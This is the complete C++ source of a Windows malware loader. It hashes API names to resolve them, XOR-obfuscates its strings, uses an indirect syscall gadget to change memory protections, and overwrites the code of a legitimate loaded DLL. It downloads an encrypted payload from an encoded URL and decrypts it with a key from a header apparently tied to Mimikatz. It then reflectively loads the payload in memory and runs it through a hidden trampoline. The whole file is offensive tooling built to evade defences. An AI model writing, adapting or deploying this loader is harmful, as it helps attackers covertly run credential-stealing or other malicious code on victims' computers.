
#include <Windows.h>
#include <winternl.h>
#include "resolve.h"

#pragma comment(lib, "user32.lib")
static volatile FARPROC _u32[] = { (FARPROC)&GetDC, (FARPROC)&ReleaseDC, (FARPROC)&GetSystemMetrics };

extern "C" NTSTATUS DoIndirectVP(LPVOID addr, SIZE_T size, DWORD prot, PDWORD old, DWORD ssn, PVOID gadget);

typedef LPVOID HINTERNET;
typedef HMODULE(WINAPI* fn_LLA)(LPCSTR);
typedef LPVOID(WINAPI* fn_VA)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* fn_VP)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HINTERNET(WINAPI* fn_IOA)(LPCSTR,DWORD,LPCSTR,LPCSTR,DWORD);
typedef HINTERNET(WINAPI* fn_IOUA)(HINTERNET,LPCSTR,LPCSTR,DWORD,DWORD,DWORD_PTR);
typedef BOOL(WINAPI* fn_IRF)(HINTERNET,LPVOID,DWORD,LPDWORD);
typedef BOOL(WINAPI* fn_ICH)(HINTERNET);
typedef BOOL(WINAPI* fn_CAC)(HCRYPTPROV*,LPCSTR,LPCSTR,DWORD,DWORD);
typedef BOOL(WINAPI* fn_CHH)(HCRYPTPROV,ALG_ID,HCRYPTKEY,DWORD,HCRYPTHASH*);
typedef BOOL(WINAPI* fn_CHD)(HCRYPTHASH,const BYTE*,DWORD,DWORD);
typedef BOOL(WINAPI* fn_CDK)(HCRYPTPROV,ALG_ID,HCRYPTHASH,DWORD,HCRYPTKEY*);
typedef BOOL(WINAPI* fn_CDT)(HCRYPTKEY,HCRYPTHASH,BOOL,DWORD,BYTE*,DWORD*);
typedef BOOL(WINAPI* fn_DK)(HCRYPTKEY);
typedef BOOL(WINAPI* fn_DH)(HCRYPTHASH);
typedef BOOL(WINAPI* fn_RC)(HCRYPTPROV,DWORD);
typedef HANDLE(WINAPI* fn_CT)(LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);
typedef DWORD(WINAPI* fn_WF)(HANDLE,DWORD);
typedef FARPROC(WINAPI* fn_GPA)(HMODULE,LPCSTR);

static void xd(char* o, const unsigned char* d, DWORD l, unsigned char k) {
    for (DWORD i=0;i<l;i++) o[i]=d[i]^k; o[l]=0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nCmdShow;

    HMODULE hK = GetModH(0xFB4F5B77u);
    if (!hK) return 0;

    fn_LLA pLLA = (fn_LLA)GetExpH(hK, 0x97FD671Fu);
    fn_VA  pVA  = (fn_VA)GetExpH(hK, 0xFB9400ABu);
    fn_VP  pVP  = (fn_VP)GetExpH(hK, 0x81BD9BADu);
    fn_CT  pCT  = (fn_CT)GetExpH(hK, 0xF51FF82Du);
    fn_WF  pWF  = (fn_WF)GetExpH(hK, 0x793529D8u);

    HMODULE hKB = GetModH(0x2390E863u);
    fn_GPA pGPA = hKB ? (fn_GPA)GetExpH(hKB, 0xB0F41F09u) : NULL;
    if (!pLLA || !pVA || !pVP || !pCT || !pWF || !pGPA) return 0;

    HMODULE hNT = GetModH(0xBFF6D513u);
    DWORD ssn = 0;
    PVOID gadget = NULL;
    if (hNT) {
        FARPROC pNtPVM = GetExpH(hNT, 0x889C44B6u);
        if (pNtPVM) ssn = *(DWORD*)((BYTE*)pNtPVM + 4);
        PIMAGE_NT_HEADERS ntNh = (PIMAGE_NT_HEADERS)((ULONG_PTR)hNT + ((PIMAGE_DOS_HEADER)hNT)->e_lfanew);
        DWORD ntSz = ntNh->OptionalHeader.SizeOfImage;
        BYTE* scan = (BYTE*)hNT;
        for (DWORD i = 0; i < ntSz - 3; i++) {
            if (scan[i] == 0x0F && scan[i+1] == 0x05 && scan[i+2] == 0xC3) {
                gadget = &scan[i];
                break;
            }
        }
    }

    char cj[16];
    const unsigned char enc_cj[] = {0x4A,0x45,0x5B,0x43,0x40,0x5D,0x07,0x4D,0x45,0x45};
    xd(cj, enc_cj, sizeof(enc_cj), 0x29);
    HMODULE hCJ = pLLA(cj);
    BYTE* cjText = NULL;
    if (hCJ) {
        PIMAGE_DOS_HEADER cjD = (PIMAGE_DOS_HEADER)hCJ;
        PIMAGE_NT_HEADERS cjN = (PIMAGE_NT_HEADERS)((ULONG_PTR)hCJ + cjD->e_lfanew);
        PIMAGE_SECTION_HEADER cjS = IMAGE_FIRST_SECTION(cjN);
        for (WORD i = 0; i < cjN->FileHeader.NumberOfSections; i++) {
            if (cjS[i].Characteristics & 0x20) {
                cjText = (BYTE*)hCJ + cjS[i].VirtualAddress;
                break;
            }
        }
        if (cjText) {
            DWORD old;
            if (ssn && gadget)
                DoIndirectVP(cjText, 4096, 0x40, &old, ssn, gadget);
            else
                pVP(cjText, 4096, 0x40, &old);
        }
    }

    char dll[16];
    const unsigned char enc_w[] = {0x40,0x5E,0x59,0x5E,0x59,0x52,0x43,0x19,0x53,0x5B,0x5B};
    xd(dll, enc_w, sizeof(enc_w), 0x37);
    HMODULE hI = pLLA(dll);
    if (!hI) return 0;

    fn_IOA pIOA = (fn_IOA)GetExpH(hI, 0x667DFFE9u);
    fn_IOUA pIOUA = (fn_IOUA)GetExpH(hI, 0xA2FFF722u);
    fn_IRF pIRF = (fn_IRF)GetExpH(hI, 0xC63CF108u);
    fn_ICH pICH = (fn_ICH)GetExpH(hI, 0x2972B160u);
    if (!pIOA || !pIOUA || !pIRF || !pICH) return 0;

    char dll2[16];
    const unsigned char enc_a[] = {0x23,0x26,0x34,0x23,0x32,0x2B,0x71,0x70,0x6C,0x26,0x2E,0x2E};
    xd(dll2, enc_a, sizeof(enc_a), 0x42);
    HMODULE hA = pLLA(dll2);
    if (!hA) return 0;

    fn_CAC pCAC = (fn_CAC)GetExpH(hA, 0x9C389AADu);
    fn_CHH pCCH = (fn_CHH)GetExpH(hA, 0x971D20FDu);
    fn_CHD pCHD = (fn_CHD)GetExpH(hA, 0x584DDBE9u);
    fn_CDK pCDK = (fn_CDK)GetExpH(hA, 0xED084395u);
    fn_CDT pCDT = (fn_CDT)GetExpH(hA, 0xC9954C26u);
    fn_DK pDK = (fn_DK)GetExpH(hA, 0x2976A3FEu);
    fn_DH pDH = (fn_DH)GetExpH(hA, 0xE4A6591Bu);
    fn_RC pRC = (fn_RC)GetExpH(hA, 0x3B6CDDFDu);
    if (!pCAC || !pCCH || !pCHD || !pCDK || !pCDT || !pDK || !pDH || !pRC) return 0;

    const unsigned char eua[] = {0x18,0x3A,0x2F,0x3C,0x39,0x39,0x34,0x7A,0x60,0x7B,0x65};
    char ua[32]; xd(ua, eua, sizeof(eua), 0x55);
    HINTERNET hNet = pIOA(ua, 0, NULL, NULL, 0);
    if (!hNet) return 0;

    const unsigned char eurl[] = {0x3D,0x21,0x21,0x25,0x6F,0x7A,0x7A,0x64,0x67,0x62,0x7B,0x65,0x7B,0x65,0x7B,0x64,0x7A,0x36,0x3C,0x25,0x3D,0x30,0x27,0x7B,0x37,0x3C,0x3B};
    char url[256]; xd(url, eurl, sizeof(eurl), 0x55);

    HINTERNET hUrl = pIOUA(hNet, url, NULL, 0, 0x84000000, 0);
    if (!hUrl) { pICH(hNet); return 0; }

    LPVOID buf = pVA(NULL, 0x200000, 0x3000, 0x04);
    if (!buf) { pICH(hUrl); pICH(hNet); return 0; }

    DWORD total = 0, rd = 0;
    while (pIRF(hUrl, (BYTE*)buf + total, 0x200000 - total, &rd) && rd > 0) total += rd;
    pICH(hUrl);
    pICH(hNet);
    if (total < 0x100) return 0;

    DWORD evSz = *(DWORD*)buf;
    if (cjText && evSz > 0 && 4 + evSz < total) {
        for (DWORD i = 0; i < evSz; i++) cjText[i] = ((BYTE*)buf)[4+i];
        ((void(*)(BYTE*))(cjText))(cjText + evSz);
        DWORD skip = 4 + evSz;
        for (DWORD mv = 0; mv < total - skip; mv++) ((BYTE*)buf)[mv] = ((BYTE*)buf)[skip + mv];
        total -= skip;
    }

    HCRYPTPROV hProv = 0;
    pCAC(&hProv, NULL, NULL, 24, 0xF0000000);
    HCRYPTHASH hHash = 0;
    pCCH(hProv, 0x8004, 0, 0, &hHash);

    #include "../mimi_key.h"
    pCHD(hHash, keyBuff, sizeof(keyBuff), 0);

    HCRYPTKEY hKey = 0;
    pCDK(hProv, 0x6610, hHash, 0, &hKey);

    DWORD decLen = total;
    pCDT(hKey, 0, TRUE, 0, (BYTE*)buf, &decLen);
    pDK(hKey); pDH(hHash); pRC(hProv, 0);
    if (decLen < 0x100) return 0;

    PIMAGE_DOS_HEADER dh = (PIMAGE_DOS_HEADER)buf;
    PIMAGE_NT_HEADERS nh = (PIMAGE_NT_HEADERS)((ULONG_PTR)buf + dh->e_lfanew);
    DWORD imgSz = nh->OptionalHeader.SizeOfImage;

    LPVOID img = pVA(NULL, imgSz, 0x3000, 0x04);
    if (!img) return 0;

    for (DWORD i = 0; i < nh->OptionalHeader.SizeOfHeaders; i++)
        ((BYTE*)img)[i] = ((BYTE*)buf)[i];

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nh);
    for (WORD i = 0; i < nh->FileHeader.NumberOfSections; i++) {
        if (sec[i].SizeOfRawData > 0) {
            BYTE* dst = (BYTE*)img + sec[i].VirtualAddress;
            BYTE* src = (BYTE*)buf + sec[i].PointerToRawData;
            for (DWORD j = 0; j < sec[i].SizeOfRawData; j++)
                dst[j] = src[j];
        }
    }

    ULONG_PTR delta = (ULONG_PTR)img - nh->OptionalHeader.ImageBase;
    IMAGE_DATA_DIRECTORY relDir = nh->OptionalHeader.DataDirectory[5];
    if (delta && relDir.VirtualAddress) {
        BYTE* reloc = (BYTE*)img + relDir.VirtualAddress;
        while (reloc < (BYTE*)img + relDir.VirtualAddress + relDir.Size) {
            DWORD rva = *(DWORD*)reloc;
            DWORD sz = *(DWORD*)(reloc + 4);
            if (!sz) break;
            WORD* entries = (WORD*)(reloc + 8);
            DWORD count = (sz - 8) / 2;
            for (DWORD i = 0; i < count; i++) {
                if ((entries[i] >> 12) == 10) {
                    ULONG_PTR* p = (ULONG_PTR*)((BYTE*)img + rva + (entries[i] & 0xFFF));
                    *p += delta;
                }
            }
            reloc += sz;
        }
    }

    {
        typedef BOOL(WINAPI* fn_AC)();
        fn_AC pAC = (fn_AC)GetExpH(hK, 0x887D7DBDu);
        if (pAC) pAC();
    }

    IMAGE_DATA_DIRECTORY impDir = nh->OptionalHeader.DataDirectory[1];
    if (impDir.VirtualAddress) {
        BYTE* id = (BYTE*)img + impDir.VirtualAddress;
        while (*(DWORD*)(id + 12)) {
            HMODULE hM = pLLA((char*)((ULONG_PTR)img + *(DWORD*)(id + 12)));
            if (hM) {
                DWORD r0 = *(DWORD*)id, r4 = *(DWORD*)(id + 16);
                ULONG_PTR* lt = (ULONG_PTR*)((BYTE*)img + (r0 ? r0 : r4));
                ULONG_PTR* at = (ULONG_PTR*)((BYTE*)img + r4);
                while (*lt) {
                    LPCSTR fn = (*lt >> 63)
                        ? (LPCSTR)(ULONG_PTR)(*lt & 0xFFFF)
                        : (LPCSTR)((BYTE*)img + (*lt & 0x7FFFFFFF) + 2);
                    *at = (ULONG_PTR)pGPA(hM, fn);
                    lt++; at++;
                }
            }
            id += 20;
        }
    }

    PIMAGE_NT_HEADERS nh2 = (PIMAGE_NT_HEADERS)((BYTE*)img + ((PIMAGE_DOS_HEADER)img)->e_lfanew);
    PIMAGE_SECTION_HEADER sec2 = IMAGE_FIRST_SECTION(nh2);
    for (WORD i = 0; i < nh2->FileHeader.NumberOfSections; i++) {
        DWORD ch = sec2[i].Characteristics;
        DWORD prot;
        BOOL exec = (ch & 0x20000000) != 0;
        BOOL wr = (ch & 0x80000000) != 0;
        if (exec && wr) prot = 0x40;
        else if (exec) prot = 0x20;
        else if (wr) prot = 0x04;
        else prot = 0x02;
        DWORD old;
        if (ssn && gadget)
            DoIndirectVP((BYTE*)img + sec2[i].VirtualAddress, sec2[i].Misc.VirtualSize, prot, &old, ssn, gadget);
        else
            pVP((BYTE*)img + sec2[i].VirtualAddress, sec2[i].Misc.VirtualSize, prot, &old);
    }

    ULONG_PTR ep = (ULONG_PTR)img + nh2->OptionalHeader.AddressOfEntryPoint;
    ULONG_PTR ta = ep;

    if (cjText) {
        unsigned char tramp[] = {
            0x51,
            0x65,0x48,0x8B,0x04,0x25,0x60,0x00,0x00,0x00,
            0x48,0x8B,0x40,0x18,
            0x48,0x8B,0x40,0x20,
            0x48,0x8B,0x00,
            0x48,0x8B,0x40,0x20,
            0x48,0x05,0x00,0x10,0x00,0x00,
            0x48,0x89,0x44,0x24,0x08,
            0x59,
            0xFF,0xE1
        };
        for (DWORD i = 0; i < sizeof(tramp); i++)
            cjText[i] = tramp[i];
        ta = (ULONG_PTR)cjText;
    }

    HANDLE hT;
    if (ta != ep)
        hT = pCT(NULL, 0, (LPTHREAD_START_ROUTINE)ta, (LPVOID)ep, 0, NULL);
    else
        hT = pCT(NULL, 0, (LPTHREAD_START_ROUTINE)ep, NULL, 0, NULL);
    if (hT) pWF(hT, 0xFFFFFFFF);

    return 0;
}
